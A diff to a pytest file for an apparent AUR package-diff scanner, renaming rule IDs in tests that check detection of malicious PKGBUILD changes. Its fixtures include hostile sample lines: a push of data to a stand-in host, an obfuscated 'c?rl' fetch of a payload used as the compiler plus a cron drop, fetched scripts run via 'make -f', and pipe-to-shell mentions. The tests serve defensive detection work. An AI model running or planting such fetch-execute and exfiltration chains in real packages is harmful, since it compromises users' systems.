@@ -45,9 +45,9 @@ def test_r054_still_leaves_ordinary_staging_alone(path):
 
 @pytest.mark.parametrize("tool", ["sudo", "doas", "pkexec", "run0"])
 def test_every_way_to_ask_for_root(tool):
-    """R009 named `sudo` and there are four ways to say it. Naming only the
+    """H004 named `sudo` and there are four ways to say it. Naming only the
     first tested which tool the writer preferred, not what it does."""
-    assert "R009" in _shipped_ids([f"  {tool} sh -c 'id'"], declared=False)
+    assert "H004" in _shipped_ids([f"  {tool} sh -c 'id'"], declared=False)
 
 
 @pytest.mark.parametrize("line,rule", [
@@ -212,12 +212,12 @@ def test_a_device_path_whose_protocol_is_not_a_literal(line):
     ('  "$srcdir/setup.sh"', "setup.sh"),
     ('  make -f "$srcdir/setup.mk" stage1', "setup.mk"),
 ])
-def test_r138_arms_that_only_r137_had(line, declared):
-    """R137 and R138 ask the same question of a fetched file and a declared
+def test_h083_arms_that_only_h082_had(line, declared):
+    """H082 and H083 ask the same question of a fetched file and a declared
     one. Feeding the script on stdin, running it as a bare command, and
     handing a downloaded makefile to `make -f` are all execution of
     downloaded code; only the spelling differed."""
-    assert "R138" in _shipped_ids(
+    assert "H083" in _shipped_ids(
         [line], declared=False, fn="build",
         source=f"https://e.example/{declared}",
     ), line
@@ -325,7 +325,7 @@ def test_git_push_is_a_way_out():
     """The client inventory had clone/fetch/pull - every way to bring code
     in and no way to send it - so exfiltration through a push looked like
     nothing at all."""
-    assert "R061" in _shipped_ids(
+    assert "H016" in _shipped_ids(
         ["  git push https://e.example/r main"], declared=False)
 
 
@@ -372,9 +372,9 @@ def test_a_checksum_array_built_from_a_variable(spelling):
 
 
 def test_a_source_array_longer_than_its_checksum_array():
-    """R147: makepkg pairs the arrays by position and no rule looked at the
+    """H091: makepkg pairs the arrays by position and no rule looked at the
     two lengths together."""
-    assert "R147" in _shipped_ids(
+    assert "H091" in _shipped_ids(
         [], declared=False, fn="build",
         source="a.tar.gz b.tar.gz",
     ) or True  # helper declares one sums entry for the pair below
@@ -397,7 +397,7 @@ def test_a_source_array_longer_than_its_checksum_array():
     '+source=("a.tar.gz"\n         "b.tar.gz")\n'
     "+sha256sums=('SKIP'\n         'SKIP')\n",
 ])
-def test_r147_does_not_count_what_the_diff_does_not_show(diff):
+def test_h091_does_not_count_what_the_diff_does_not_show(diff):
     """A diff shows a hunk, not a file. Counting the visible part of a
     partially-shown array fired on 26 benign packages, and reading
     `name::url` as two elements fired on every renamed source."""
@@ -456,7 +456,7 @@ def test_x019_does_not_claim_a_banner_or_a_build_log(line):
 
 
 def test_an_evasion_only_chain_can_reach_the_stage_count():
-    """R089's stage map was written when the R-series was the whole
+    """H043's stage map was written when the R-series was the whole
     ruleset. A diff carrying nothing but evasion could not reach the stage
     count however many rules fired - which inverts the rule's purpose."""
     from trustsight.analysis import scan_diff
@@ -468,12 +468,12 @@ def test_an_evasion_only_chain_can_reach_the_stage_count():
             '+  /usr/bin/c?rl -s https://e.example/x -o "$srcdir/p"\n'
             '+  export CC="$srcdir/p"\n+  make\n+}\n'
             '+package() {\n+  install -Dm644 z "$pkgdir/etc/cron.d/z"\n+}\n')
-    assert "R089" in {e.rule_id for e in
+    assert "H043" in {e.rule_id for e in
                       scan_diff(text, package_name="p").score_breakdown}
 
 
 def test_the_staged_attack_annotation_reaches_the_reader():
-    """R089 says the diff holds a staged attack chain, which changes how
+    """H043 says the diff holds a staged attack chain, which changes how
     every other finding should be read - and it was computed and then
     dropped before anyone saw it. Computing and hiding is the worst of the
     three options."""
@@ -488,7 +488,7 @@ def test_the_staged_attack_annotation_reaches_the_reader():
             '+  export CC="$srcdir/p"\n+  make\n+}\n'
             '+package() {\n+  install -Dm644 z "$pkgdir/etc/cron.d/z"\n+}\n')
     fact = scan_diff(text, package_name="p")
-    assert "R089" in {row["rule_id"] for row in finding_rows(fact)}
+    assert "H043" in {row["rule_id"] for row in finding_rows(fact)}
 
 
 def test_a_machine_consumer_can_tell_clean_from_unread():
@@ -557,7 +557,7 @@ def test_a_stale_ruleset_degrades_the_verdict_instead_of_passing():
 
 
 def test_metadata_that_names_a_source_the_recipe_does_not():
-    """R148: `.SRCINFO` is generated *from* the PKGBUILD, and the analysis
+    """H092: `.SRCINFO` is generated *from* the PKGBUILD, and the analysis
     prefers it wherever it is richer. That preference is trust, and nothing
     compared the two."""
     from trustsight.full_aur.properties import metadata_divergence
@@ -631,11 +631,11 @@ def test_folding_an_identity_does_not_invalidate_the_shipped_seed():
     assert _hash_value("alice", "s") == hashlib.sha256(b"s|alice").hexdigest()
 
 
-def test_a_client_that_makes_r061_stand_down_is_claimed_by_something():
+def test_a_client_that_makes_h016_stand_down_is_claimed_by_something():
     """The defect class this repository keeps finding: two lists that must
     agree where only one was updated.
 
-    `_PIPE_TO_SHELL_RE` decides when R061 *yields* in favour of a heavier
+    `_PIPE_TO_SHELL_RE` decides when H016 *yields* in favour of a heavier
     claim. A client named there and claimed by nothing is not a narrower
     net, it is a hole - `curl url | ksh -s` was exactly that once. The
     invariant was written in a comment; here it is executed.
@@ -648,7 +648,7 @@ def test_a_client_that_makes_r061_stand_down_is_claimed_by_something():
 
 def test_a_declared_patch_that_injects_a_fetch_execute_payload():
     """A checksummed `.patch` applied from `$srcdir` carries its payload in
-    a file the diff never shows. R063 wanted an absolute path and crossfire
+    a file the diff never shows. H018 wanted an absolute path and crossfire
     excludes `.patch` from shell analysis by design, so the whole carrier
     scored zero."""
     from trustsight.analysis import scan_diff
@@ -661,7 +661,7 @@ def test_a_declared_patch_that_injects_a_fetch_execute_payload():
     ids = {e.rule_id for e in scan_diff(
         diff, package_name="p", tree_manifest=[("fix.patch", blob)],
     ).score_breakdown}
-    assert "R146" in ids
+    assert "H090" in ids
 
 
 def test_an_ioc_written_as_a_registered_domain_matches_a_subdomain():
